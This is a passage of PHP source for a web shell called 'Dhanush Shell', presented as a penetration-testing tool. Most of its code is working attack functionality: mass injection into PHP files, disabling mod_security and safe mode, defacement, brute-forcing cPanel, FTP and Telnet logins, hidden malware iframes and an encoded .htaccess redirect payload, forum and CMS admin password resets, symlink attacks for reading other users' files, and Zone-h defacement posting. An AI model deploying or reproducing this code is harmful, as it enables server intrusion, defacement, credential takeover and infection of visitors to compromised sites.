		<td class="myfun"><a href="<?php echo $self.'?about'?>"><font class="fun">[ About ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?selfkill'?>" onClick="if(confirm('Are You Sure You Want To Kill This Shell ?')){return true;}else{return false;}"><font class="fun">[ SelfKill ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?logout'?>"><font class="fun">[ LogOut ]</font></a></td>
	</tr>
</table>

<table align="center" class="pwdtbl"><br>
    <tr>
        <form method="GET"  action="<?php echo $self; ?>">
        <td style="width:35%;" align="right"> Present Working Directory : </td><td style="width:20%;"><input name="dir" class="box" style="width:300px;" value="<?php if($dir == null){echo getcwd();} else { echo $dir; } ?>"/></td>
        <td><input type="submit" value="  Go  " class="but" /></td><td align="right"><?php if($os == "Linux") { ?>
		<a href="<?php echo $self.'?downloadit'; ?>"><font class="txt">Download It</font></a><?php } ?></td>
        </form>
    </tr>
</table>

<?php

if(isset($_POST['pathtomass']) &&  $_POST['pathtomass'] != '' &&  isset($_POST['filetype']) &&  $_POST['filetype'] != '' &&  isset($_POST['mode']) &&  $_POST['mode'] != '' && isset($_POST['injectthis']) &&  $_POST['injectthis'] != '')
    {
        //$dir = $_GET['dir'];
        $filetype = $_POST['filetype'];
        //$message = $_GET['message'];
        
        $mode = "a"; //default mode
        
        
        // Modes Begin
        
        if($_POST['mode'] == 'Apender')
        {
            $mode = "a";
        }
        if($_POST['mode'] == 'Overwriter')
        {
            $mode = "w";
        }
        
        if ($_POST['filetype'] == 'php') 
		{
			if (is_dir($_POST['pathtomass'])) 
			{
				$lolinject = $_POST['injectthis'];
				foreach (glob($_POST['pathtomass'] . $directorysperator . "*.php") as $injectj00) 
				{
					$fp=fopen($injectj00,$mode);
					if (fputs($fp,$lolinject)){
						echo '<br><font class=txt>'.$injectj00.' was injected<br></font>';
				} else {
						echo 'failed to inject '.$injectj00.'';
				}
			}
		} else 
			{ //end if inputted dir is real -- if not, show an ugly red error
			echo '<b>'.$_POST['pathtomass'].' is not available!</b>';
			} // end if inputted dir is real, for real this time
		} // end if confirmation to mass sploit is php only
	} // end if massbrowsersploit is called

if(isset($_GET['set404']))
{
	echo "<center><blink><font color=lime>Done setting 404 Page</font></blink></center>";
}
if(isset($_GET['cannotset404']))
{
	echo "<center><blink><font color=red>Cannot Set 404 Page</font></blink></center>";
}

if(isset($_GET['to']) && isset($_GET['file']))
{
     if(!rename($_GET['file'], $_GET['to']))
     {
	 	$loc = $_SERVER["SCRIPT_NAME"] . "?dir=" . $_GET['getdir'];
		header("Location:$loc");
		ob_end_flush();
       
     }
     else
     {
	 	$loc = $_SERVER["SCRIPT_NAME"] . "?dir=" . $_GET['getdir'];
		header("Location:$loc");
		ob_end_flush();
        
     }
}

	
	if(isset($_POST["changeperms"]))
	{
		if($_POST['chmode'] != null && is_numeric($_POST['chmode']))
		{
			$perms = 0; 
            for($i=strlen($_POST['chmode'])-1;$i>=0;--$i) 
                $perms += (int)$_POST['chmode'][$i]*pow(8, (strlen($_POST['chmode'])-$i-1)); 
			if(@chmod($_POST['myfilename'],$perms))
				echo "<center><blink><font size=3>File Permissions Changed Successfully</font></blink></center>";
			else
				echo "<center><blink><font size=3 class=txt>Cannot Change File Permissions</font></blink></center>";
		}
	}
	
$setuploadvalue = 0;
if(isset($_POST['u']))
	{
		$path = $_REQUEST['path'];
		if(is_dir($path))
        {
            $uploadedFilePath = $_FILES['uploadfile']['name'];
			//echo $uploadedFilePath;
            $tempName = $_FILES['uploadfile']['tmp_name'];
			//echo $tempName;
			if($os == "Windows")
	            $uploadPath = $path . $directorysperator .  $uploadedFilePath;
			else if($os == "Linux")
				 $uploadPath = $path . $directorysperator . $uploadedFilePath;
			if($stat = move_uploaded_file($_FILES['uploadfile']['tmp_name'] , $uploadPath))
            {
               echo "<center><font class=txt size=3><blink>File uploaded to $uploadPath</blink></font></center>";	
			   //header("Location:");			
            }
            else
            {
                echo "<center><font size=3><blink>Failed to upload file to $uploadPath</blink></font></center>";
            }
         }
	}
		
	if(isset($_POST['createdir']))
	{
		if(!mkdir($_POST['createfolder']))
			echo "Failed To create";
	}
if(isset($_POST['createmyfile'])&&isset($_POST['filecontent']))
{
	$content = $_POST['filecontent'];
	$file_pointer = fopen($_POST['filecreator'], "w+");
	fwrite($file_pointer, $content); 
	fclose($file_pointer);
	$loc = $_SERVER['REQUEST_URI'];
	header("Location:$loc");
	ob_end_flush();
}


//Turn Safe Mode Off

	if(getDisabledFunctions() != "None" || safe() != "OFF")
	{
	   	$file_pointer = fopen(".htaccess", "w+");
		fwrite($file_pointer, "<IfModule mod_security.c>
    				SecFilterEngine Off
   					 SecFilterScanPOST Off
					</IfModule>"); 
			
		$file_pointer = fopen("ini.php", "w+");
		fwrite($file_pointer, "<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>"); 

		$file_pointer = fopen("php.ini", "w+");
		fwrite($file_pointer, "safe_mode               =       Off"); 
					
		fclose($file_pointer); 
		//echo "Safe Mode Is Now Off..";
    }
	
	if(isset($_GET["downloadit"]))
	{
		$FolderToCompress = getcwd(); 
		execmd("tar --create --recursion --file=backup.tar $FolderToCompress"); 
		
		$prd=explode("/","backup.tar");
		for($i=0;$i<sizeof($prd);$i++)
		{
			$nfd=$prd[$i];
		}
		@ob_clean(); 
	   header("Content-type: application/octet-stream"); 
	   header("Content-length: ".filesize($nfd)); 
	   header("Content-disposition: attachment; filename=\"".$nfd."\";"); 
   	   readfile($nfd);

   	   exit;
	}
	
	if(isset($_POST['uploadurl']))
	{ 
		$functiontype = trim($_POST['functiontype']); 
		$wurl = trim($_POST['wurl']); 
		$path = magicboom($_POST['path']); 
		$namafile = remotedownload($functiontype,$wurl); 
		$fullpath = $path . $directorysperator . $namafile; 
		if(is_file($fullpath)) 
		{ 
			echo "<center><font class=txt size=3>File uploaded to $fullpath</font></center>"; 
		} 
		else 
			echo "<center><font size=3>Failed to upload $namafile</font></center>"; 
	}
	
	else if(isset($_GET['about']))
	{ ?>
		<bR><center>
		  <p><font size=6><u>D h a n u s h</u></font><br>
		      <font size=5>[--==Coded By Arjun==--]</font><br>
		    <br><div style='font-family: Courier New; font-size: 10px;'><pre>

       -  --  -
       -- -- --
       --    --
       ---  ---
       ------
       ----
   ----             
 ------           
-------          
---   --          
      --      --- 
      --      ----- 
     ---      --- --- 
     ---    ---   ---
--   ---------     --
--    -------      --
 --     ----       --
  --     ---       --

  --     --        --
   ---  ---   --  ---
    ------    ------
     ----      ----
      

		</pre></div></center>
		Dhanush Shell is a PHP Script, created for checking the vulnerability and security of any web server or website. With this PHP script, the owner can check various vulnerablities present in the web server. This shell provide you almost every facility that the security analyst need for penetration testing. This is a "All In One" php script, so that the user do not need to go anywhere else.<br> This script is coded by an Indian Ethical Hacker.<br> This script is only coded for education purpose or testing on your own server.The developer of the script is not responsible for any damage or misuse of it<br><br><center><font size=5>GREETZ To All Indian Hackers</font><br><font size=6>| &#2332;&#2351; &#2350;&#2361;&#2366;&#2325;&#2366;&#2354; | | &#2332;&#2351; &#2361;&#2367;&#2344;&#2381;&#2342; |</font></center><br>
	<?php }
	
	// Zone-h Poster
	else if(isset($_GET["zone"]))
	{  
		if(!function_exists('curl_version'))
		{
			echo "<pre class=ml1 style='margin-top:5px'><center><font class=txt>PHP CURL NOT EXIT</font></center></pre>";
		}
		?>
		<center><font size="4">Zone-h Poster</font></center>
		<form action="<?php echo $self; ?>" method="post">
		<table align="center" cellpadding="5" border="0">
		<tr>
		<td>
		<input type="text" name="defacer" value="Team_CC" class="box" /></td></tr>
		<tr><td>
		<select name="hackmode" class="box">
			<option >--------SELECT--------</option>
			<option value="1">known vulnerability (i.e. unpatched system)</option>
			<option value="2" >undisclosed (new) vulnerability</option>
			<option value="3" >configuration / admin. mistake</option>
			<option value="4" >brute force attack</option>
			<option value="5" >social engineering</option>
			<option value="6" >Web Server intrusion</option>
			<option value="7" >Web Server external module intrusion</option>
			<option value="8" >Mail Server intrusion</option>
			<option value="9" >FTP Server intrusion</option>
			<option value="10" >SSH Server intrusion</option>
			<option value="11" >Telnet Server intrusion</option>
			<option value="12" >RPC Server intrusion</option>
			<option value="13" >Shares misconfiguration</option>
			<option value="14" >Other Server intrusion</option>
			<option value="15" >SQL Injection</option>
			<option value="16" >URL Poisoning</option>
			<option value="17" >File Inclusion</option>
			<option value="18" >Other Web Application bug</option>
			<option value="19" >Remote administrative panel access bruteforcing</option>
			<option value="20" >Remote administrative panel access password guessing</option>
			<option value="21" >Remote administrative panel access social engineering</option>
			<option value="22" >Attack against administrator(password stealing/sniffing)</option>
			<option value="23" >Access credentials through Man In the Middle attack</option>
			<option value="24" >Remote service password guessing</option>
			<option value="25" >Remote service password bruteforce</option>
			<option value="26" >Rerouting after attacking the Firewall</option>
			<option value="27" >Rerouting after attacking the Router</option>
			<option value="28" >DNS attack through social engineering</option>
			<option value="29" >DNS attack through cache poisoning</option>
			<option value="30" >Not available</option>
		</select>
		</td></tr>
		<tr><td>
		<select name="reason" class="box">
			<option >--------SELECT--------</option>
			<option value="1" >Heh...just for fun!</option>
			<option value="2" >Revenge against that website</option>
			<option value="3" >Political reasons</option>
			<option value="4" >As a challenge</option>
			<option value="5" >I just want to be the best defacer</option>
			<option value="6" >Patriotism</option>
			<option value="7" >Not available</option>
		</select></td></tr>
		<tr><td>
		<textarea name="domain" class="box" cols="47" rows="9">List Of Domains</textarea></td></tr>
		<tr><td>
		<input type="submit" class="but" value="Send Now !" name="SendNowToZoneH" /></td></tr></table>
		</form>
	<?php }
	
	// Deface Website
	else if(isset($_GET['deface']))
	{
		$myfile = fopen($_GET['deface'],'w');
		fwrite($myfile, base64_decode($ind));
		fclose($myfile);
		header("Location:$self");
		ob_end_flush();
	}
	
	// Cpanel Cracker
	else if(isset($_REQUEST['cpanel']))
	{
		$cpanel_port="2082";
		$connect_timeout=5;
		if(!isset($_POST['username']) && !isset($_POST['password']) && !isset($_POST['target']) && !isset($_POST['cracktype']))
		{
		?>
		<center>
		<form method=post>
		<table style="width:50%;" border=1 cellpadding=4>
			<tr>
				<td align=center colspan=2>Target : <input type=text name="server" value="localhost" class=sbox></td>
			</tr>
			<tr>
				<td align=center>User names</td><td align=center>Password</td>
			</tr>
			<tr>
				<td align=center><textarea name=username rows=25 cols=22 class=box><?php 
				if($os != "Windows")
				{
					if(@file('/etc/passwd'))
					{
						$users = file('/etc/passwd');
						foreach($users as $user) 
						{
							$user = explode(':', $user);
							echo $user[0] . "\n";
						}
					}
					else
					{
						$temp = "";
						$val1 = 0;
						$val2 = 1000;
						for(;$val1 <= $val2;$val1++) 
						{
							$uid = @posix_getpwuid($val1);
							if ($uid)
								 $temp .= join(':',$uid)."\n";
						 }
						
						 $temp = trim($temp);
							 
						 if($file5 = fopen("test.txt","w"))
						 {
							fputs($file5,$temp);
							 fclose($file5);
							 
							 $file = fopen("test.txt", "r");
							 while(!feof($file))
							 {
							 	$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/","",$matches[1]);
								if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo $matches;
							}
							fclose($file);
						}
					}
				}
				 ?></textarea></td><td align=center><textarea name=password rows=25 cols=22 class=box></textarea></td>
			</tr>
			<tr>
				<td align=center colspan=2>Guess options : <label><input name="cracktype" type="radio" value="cpanel" checked> Cpanel(2082)</label><label><input name="cracktype" type="radio" value="ftp"> Ftp(21)</label><label><input name="cracktype" type="radio" value="telnet"> Telnet(23)</label></td>
			</tr>
			<tr>
				<td align=center colspan=2>Timeout delay : <input type="text" name="delay" value=5 class=sbox></td>
			</tr>
			<tr>
				<td align=center colspan=2><input type="submit" value="   Go    " class=but></td>
			</tr>
		</table>
		</form>
		</center>
		<?php
		}
		else
		{
			if(empty($_POST['username']) || empty($_POST['password']))
				echo "<center>Please Enter The Users or Password List</center>";
			else
			{
				$userlist=explode("\n",$_POST['username']);
				$passlist=explode("\n",$_POST['password']);
	
				if($_POST['cracktype'] == "ftp")
				{
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							ftp_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
				if ($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet")
				{
					if($cracktype == "telnet")
					{
						$cpanel_port="23";
					}
					else
						$cpanel_port="2082";
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						echo "<b><font face=Tahoma style=\"font-size: 9pt\" color=#008000> [ - ] </font><font face=Tahoma style=\"font-size: 9pt\" color=#FF0800>
						Processing user $pureuser ...</font></b><br><br>";
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							cpanel_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
			}
		}
	}
	
	// Deface Website
	else if(isset($_REQUEST['malattack']))
	{
		?>
		<center><table><tr><td><a href="<?php echo $self; ?>?malattack&malware&dir=<?php echo $_GET['dir']; ?>"><font size="4">| Malware Attack |</font></a></td>
		<td><a href="<?php echo $self; ?>?malattack&codeinsert&dir=<?php echo $_GET['dir']; ?>"><font size="4">| Insert Own Code |</font></a></td></tr></table></center><br>
		<?php
		if(isset($_GET['malware']))
		{
			?>
		<center><table><tr><td><a href="<?php echo $self; ?>?malattack&malware&infect&dir=<?php echo $_GET['dir']; ?>"><font size="4">| Infect Users |</font></a></td>
		<td><a href="<?php echo $self; ?>?malattack&malware&redirect&dir=<?php echo $_GET['dir']; ?>"><font size="4">| Redirect Search Engine TO Malwared site |</font></a></td></tr></table></center>
		<?php
			if(isset($_GET['redirect']))
			{
				if($myfile = fopen(".htaccess",'a'))
				{
					$mal = "eNqV0UtrAjEQAOC70P8wYHsRyRa8FYpQSR9QXAmCBxHJrkMSjDNhk/pA/O+uFuyx5javj4GZLrzJj68xzLhZTRqM8aGjcNe4hJKMI4SSbpUyJMcUwZHFNr/VR0wreDp+TqeTpZLvUkl1AtHTcS1q3ojeI8zHo36pFv8Jw2w8ZoBNpMuK+0HlyOQJ77aYJzT7TOCT3rqYdB7Dfd0280xE3dRWHLRl/lV/RP14bEfAphReisJ4rrQPvGt/TcboZK8BXy9eOBLBhiG9Dp5hrvrfizOeH7rw";
					fwrite($myfile, gzuncompress(base64_decode($mal)));
					fwrite($myfile, "\n\r");
					fclose($myfile);
					$mydir = "dir=".$_GET['dir'];
					header("Location:$self?malattack&$mydir");
					ob_end_flush();
				}
				else
					echo "<center>Cannot open file !!!!<center>";
			}
			else if(isset($_GET['infect']))
			{
				$coun = 0;
				$str = "<iframe width=0px height=0px frameborder=no name=frame1 src=".$malsite."> </iframe>";
				foreach (glob($_GET['dir'] . $directorysperator . "*.php") as $injectj00) 
				   {
					    if($myfile=fopen($injectj00,'a'))
					    {
						fputs($myfile, $str);
						fclose($myfile);
					    }
					    else
						$coun = 1;	
			     	  }
				  foreach (glob($_GET['dir'] . $directorysperator . "*.htm") as $injectj00) 
				  {
					    if($myfile=fopen($injectj00,'a'))
					    {	
					    	fputs($myfile, $str);
						fclose($myfile);
					    }
					    else
						$coun = 1;
			    	 }
				  foreach (glob($_GET['dir'] . $directorysperator . "*.html") as $injectj00) 
				  {
					    if($myfile=fopen($injectj00,'a'))
					    {
						fputs($myfile, $str);
						fclose($myfile);
				            }
					    else
						$coun = 1;
			     	  }
				 
				if($coun == 0)
					echo "<center>Done !!!!<center>";
				else
					echo "<center>Cannot open files !!!!<center>";
			}
		}
		else if(isset($_GET['codeinsert']))
		{
			if(!isset($_POST['code'])) 
			{ 
				if($file1 = fopen(".htaccess",'r'))
				{ ?>
				<form method=post>
				<textarea rows=9 cols=110 name="code" class=box><?php while(!feof($file1)) { echo fgets($file1); } ?></textarea><br>
				<input type="submit" value="  Insert  " class=but>
				</form>
			<?php   }
				else
					echo "<center>Cannot Open File!!</center>";
			}else
			{
				if($myfile = fopen(".htaccess",'a'))
				{
					fwrite($myfile, $_POST['code']);
					fwrite($myfile, "\n\r");
					fclose($myfile);
					header("Location:$self?malattack");
					ob_end_flush();
				}
				else
					echo "Permission Denied";
			}
		}
	}

	// Password Change Forums
	else if(isset($_POST['forumpass']))
	{
		$localhost =  $_POST['f1']; 
		$database =  $_POST['f2']; 
		$username =  $_POST['f3']; 
		$password =  $_POST['f4']; 
		$prefix    =  $_POST['prefix'];
		$uid = $_POST['uid'];
		$newpass = $_POST['newpass'];
		if($_POST['forums'] == "vb")
		{	
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "eghjghrtd";
			$newpassword = md5(md5($newpass) . $salt);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update user set password = '$newpassword', salt = '$salt' where userid = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."user set password = '$newpassword', salt = '$salt' where userid = '$uid'");
			if($sql)
			{
				mysql_close($con);
				header("Location:$self?forum&passwordchange&changed");
				ob_end_flush();
			}
			else
				header("Location:$self?forum&passwordchange&cannotchange");
		}
		if($_POST['forums'] == "mybb")
		{	
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "jeghj";
			$newpassword = md5(md5($salt).$newpass);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update mybb_users set password = '$newpassword', salt = '$salt' where uid = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set password = '$newpassword', salt = '$salt' where uid = '$uid'");
			if($sql)
			{
				mysql_close($con);
				header("Location:$self?forum&passwordchange&changed");
				ob_end_flush();
			}
			else
				header("Location:$self?forum&passwordchange&cannotchange");
		}
		if($_POST['forums'] == "smf")
		{	
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "eghj";
				
			if($prefix == "" || $prefix == null)
			{
				$result = mysql_query("select member_name from smf_members where id_member = 1");
				$row = mysql_fetch_array($result);
				$membername = $row['member_name'];
				$newpassword = sha1(strtolower($membername).$newpass);
				$sql = mysql_query("update smf_members set passwd = '$newpassword' where id_member = '$uid'");
			}
			else
			{
				$result = mysql_query("select member_name from ".$prefix."members where id_member = 1");
				$row = mysql_fetch_array($result);
				$membername = $row['member_name'];
				$newpassword = sha1(strtolower($membername).$newpass);
				$sql = mysql_query("update ".$prefix."members set passwd = '$newpassword' where id_member = '$uid'");
			}
			if($sql)
			{
				mysql_close($con);
				header("Location:$self?forum&passwordchange&changed");
				ob_end_flush();
			}
			else
				header("Location:$self?forum&passwordchange&cannotchange");
		}
		if($_POST['forums'] == "phpbb")
		{	
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			
			$newpassword = md5($newpass);echo $newpassword;
			if(empty($prefix) || $prefix == null)
				$sql = mysql_query("update phpbb_users set user_password = '$newpassword' where user_id = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set user_password = '$newpassword' where user_id = '$uid'");
			if($sql)
			{
				mysql_close($con);
				header("Location:$self?forum&passwordchange&changed");
				ob_end_flush();
			}
			else
				header("Location:$self?forum&passwordchange&cannotchange");
		}
		if($_POST['forums'] == "ipb")
		{
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "eghj";
			$newpassword = md5(md5($salt).md5($newpass));
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update members set members_pass_hash = '$newpassword', members_pass_salt = '$salt' where member_id = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."members set members_pass_hash = '$newpassword', members_pass_salt = '$salt' where member_id = '$uid'");
			if($sql)
			{
				mysql_close($con);
				header("Location:$self?forum&passwordchange&changed");
				ob_end_flush();
			}
			else
				header("Location:$self?forum&passwordchange&cannotchange");
		}
		if($_POST['forums'] == "wp")
		{	
			$uname = $_POST['uname'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);

			$newpassword = md5($newpass);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update wp_users set user_pass = '$newpassword', user_login = '$uname' where ID = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set user_pass = '$newpassword', user_login = '$uname' where ID = '$uid'");
			if($sql)
			{
				mysql_close($con);
				header("Location:$self?forum&passwordchange&changed#wordp");
				ob_end_flush();
			}
			else
				header("Location:$self?forum&passwordchange&cannotchange#wordp");
		}
		if($_POST['forums'] == "joomla")
		{	
			$uname = $_POST['uname'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);

			$newpassword = md5($newpass);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update jos_users set password = '$newpassword', username = '$uname' where name = 'Super User'");
			else
				$sql = mysql_query("update ".$prefix."users set password = '$newpassword', username = '$uname' where name = 'Super User' OR name = 'Administrator'");
			if($sql)
			{
				mysql_close($con);
				header("Location:$self?forum&passwordchange&changed#jooml");
				ob_end_flush();
			}
			else
				header("Location:$self?forum&passwordchange&cannotchange#jooml");
		}
	}
	
	else if(isset($_GET['whois']))
	{
		echo "<br>".nl2br(shell_exec("whois ".$_GET['whois']))."";
	}

	// Get Domains
	else if(isset($_REQUEST["symlinkserver"]))
	{
		?>
		<center><table><tr><td><a href="<?php echo $self; ?>?domains&symlinkserver">| Get Domains |</a></td>
		<td><a href="<?php echo $self; ?>?symlink&symlinkserver">| Symlink Server |</a></td>
		<td><a href="<?php echo $self; ?>?symlinkfile&symlinkserver">| Symlink File |</a></td>
		<td><a href="<?php echo $self; ?>?script&symlinkserver">| Script Locator |</a></td>
		</tr></table></center><br>
		<?php 
		if(isset($_GET["domains"])) 
		{
		?>	<center><iframe src="<?php echo 'http://sameip.org/ip/' . getenv('SERVER_ADDR'); ?>" width="80%" height="1000px"></iframe></center>
		<?php }
		else if(isset($_GET["symlink"])) 
		{
			$d0mains = @file("/etc/named.conf");
			
			if($d0mains)
			{ 
		     	@mkdir("dhanush",0777);
				@chdir("dhanush");
				execmd("ln -s / root");
				$file3 = 'Options all 
	 DirectoryIndex Sux.html 
	 AddType text/plain .php 
	 AddHandler server-parsed .php 
	  AddType text/plain .html 
	 AddHandler txt .html 
	 Require None 
	 Satisfy Any        
	';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);
				@fclose($fp3);
						echo "<table align=center border=1 style='width:60%;border-color:#10445A;'><tr><td align=center><font size=3>S. No.</font></td><td align=center><font size=3>Domains</font></td><td align=center><font size=3>Users</font></td><td align=center><font size=3>Symlink</font></td><td align=center><font size=3>Information</font></td></tr>";
					
				$dcount = 1;
				foreach($d0mains as $d0main)
				{
					if(eregi("zone",$d0main))
					{
						preg_match_all('#zone "(.*)"#', $d0main, $domains);
						flush();
							
						if(strlen(trim($domains[1][0])) > 2)
						{ 
							$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
							echo "<tr align=center><td><font size=3>" . $dcount . "</font></td><td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td><td>".$user['name']."</td><td><a href='/dhanush/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td><td><a href=?whois=".$domains[1][0]." target=_blank>info</a></td></tr>"; flush();
							$dcount++;
						}
					}
				}
				echo "</table>";
			}
			else
			{
					$TEST=@file('/etc/passwd');
					if ($TEST) 
					{
						@mkdir("dhanush",0777);
						@chdir("dhanush");
						execmd("ln -s / root");
						$file3 = 'Options all 
			 DirectoryIndex Sux.html 
			 AddType text/plain .php 
			 AddHandler server-parsed .php 
			  AddType text/plain .html 
			 AddHandler txt .html 
			 Require None 
			 Satisfy Any        
			';
						$fp3 = fopen('.htaccess','w');
						$fw3 = fwrite($fp3,$file3);
						@fclose($fp3);
						
						echo "<table align=center border=1 style='width:40%;border-color:#10445A;'><tr><td align=center><font size=4>S. No.</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";
						
						$dcount = 1;
						$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
						//Output a line of the file until the end is reached
						while(!feof($file))
						{
							$s = fgets($file);
							$matches = array();
							$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
							$matches = str_replace("home/","",$matches[1]);
							if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							echo "<tr><td align=center><font size=3>" . $dcount . "</td><td align=center><font class=txt>" . $matches . "</td>";
						    echo "<td align=center><font class=txt><a href=/dhanush/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
							$dcount++;
						}
						fclose($file);
						
						echo "</table>";
					}
					else
					{
						if($os != "Windows")
						{
							@mkdir("dhanush",0777);
							@chdir("dhanush");
							execmd("ln -s / root");
							$file3 = 'Options all 
				 DirectoryIndex Sux.html 
				 AddType text/plain .php 
				 AddHandler server-parsed .php 
				  AddType text/plain .html 
				 AddHandler txt .html 
				 Require None 
				 Satisfy Any        
				';
							$fp3 = fopen('.htaccess','w');
							$fw3 = fwrite($fp3,$file3);
							@fclose($fp3);
							
							echo "<table align=center border=1 style='width:40%;border-color:#333333;'><tr><td align=center><font size=4>S. No.</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";
							
							$temp = "";
							$val1 = 0;
							$val2 = 1000;
							for(;$val1 <= $val2;$val1++) 
							{
								$uid = @posix_getpwuid($val1);
								if ($uid)
									 $temp .= join(':',$uid)."\n";
							 }
							 echo '<br/>';
							 $temp = trim($temp);
							 
							 $file5 = fopen("test.txt","w");
							 fputs($file5,$temp);
							 fclose($file5);
							 
							$dcount = 1;
							 $file = fopen("test.txt", "r") or exit("Unable to open file!");
							 while(!feof($file))
							 {
								$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/","",$matches[1]);
								if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo "<tr><td align=center><font size=3>" . $dcount . "</td><td align=center><font class=txt>" . $matches . "</td>";
								echo "<td align=center><font class=txt><a href=/dhanush/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
								$dcount++;
							 }
							fclose($file);
							echo "</table>";
							unlink("test.txt");
						}
						else
							echo "<center><font size=4>Cannot create Symlink</font></center>";
					}
				}
			}
			else if(isset($_GET["symlinkfile"])) 
			{
				if(!isset($_GET['file']))
				{
					?>
					<center>
					<form action="<?php echo $self; ?>">
					<input type="hidden" name="symlinkserver">
					<input type="hidden" name="symlinkfile">
					<input type="text" class="box" name="file" size="50" value="">
					<input type="submit" value="Create Symlink" class="but">
					</form></center>
					<br><br>
					<?php
				}
				else
				{
					$fakedir="cx";
					$fakedep=16;
					
					$num=0; // offset of symlink.$num
					
					if(!empty($_GET['file'])) $file=$_GET['file'];
					else if(!empty($_POST['file'])) $file=$_POST['file'];
					else $file="";
										
					if(empty($file))
						exit;
					
					if(!is_writable("."))
						die("not writable directory");
					
					$level=0;
					
					for($as=0;$as<$fakedep;$as++){
						if(!file_exists($fakedir))
							mkdir($fakedir);
						chdir($fakedir);
					}
					
					while(1<$as--) chdir("..");
					
					$hardstyle = explode("/", $file);
					
					for($a=0;$a<count($hardstyle);$a++){
					if(!empty($hardstyle[$a])){
						if(!file_exists($hardstyle[$a])) 
							mkdir($hardstyle[$a]);
						chdir($hardstyle[$a]);
						$as++;
					}
				}
			$as++;
			while($as--)
					chdir("..");
				
				@rmdir("fakesymlink");
				@unlink("fakesymlink");
				
				@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
				
				// this loop will skip allready created symlinks.
				while(1)
					if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break;
					else $num++;
				
				@unlink("fakesymlink");
				mkdir("fakesymlink");
					
				die('<FONT class=txt>check symlink <a href="./symlink'.$num.'">symlink'.$num.'</a> file</FONT>');
				
			}
		}
		else if(isset($_REQUEST["script"])) 
		{
			?>
			<center><table><tr><td><a href="<?php echo $self; ?>?manually&script&symlinkserver"><font class="tblheads">| Do It Manually |</font></a></td>
		<td><a href="<?php echo $self; ?>?automatic&script&symlinkserver"><font class="tblheads">| Do It Automatically |</font></a></td>
		</tr></table></center>
			<?php
			if(isset($_REQUEST['manually']))
			{
				if(!isset($_REQUEST['passwd']))
				{
				?>
				<center>
				<form action="<?php echo $self; ?>" method="post">
				<input type="hidden" name="manually">
				<input type="hidden" name="script">
				<input type="hidden" name="symlinkserver">
				<textarea class="box" rows="16" cols="100" name="passwd"></textarea><br>
				<input type="submit" value="Get Config" class="but">
				</form>
				</center>
				<?php
				}
				else
				{
					$getetc = trim($_REQUEST['passwd']);
					
					mkdir("dhanushSPT");
					chdir("dhanushSPT");
					
					$myfile = fopen("test.txt","w");
					fputs($myfile,$getetc);
					fclose($myfile);
						 
